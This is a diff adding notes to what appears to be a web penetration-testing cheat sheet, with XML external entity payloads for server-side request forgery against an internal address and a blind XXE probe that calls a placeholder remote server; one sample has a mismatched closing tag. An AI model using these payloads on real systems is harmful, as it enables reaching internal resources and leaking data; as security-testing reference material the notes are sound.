@@ -245,8 +245,26 @@ No instead of sending a text, we can try external ENTITY (file:///c:/boot.ini) f
 </root>
 ```
 
+3.18. SSRF through XXE
 
+```
+Allow outsider to force the server to initiate a Request to internal recourses
 
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.196.254">]>
+<root>
+  <name>mo</name>
+  <email>&xxe;</name>
+</root>
+```
+
+3.19. Advanced XXE (Blind XXE), using Parameter ENTITY to enforce the server to make a call to my server and check if my server getting requests or not.
+Parameter ENTITY can be only used within the DTD, we can use the below payload to check for Blind XXE.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE data [<!ENTITY % remote SYSTEM "http://remoteserverIP/index.html">%remote;]>
+```
 
 ## 7. Business Logic Testing
 
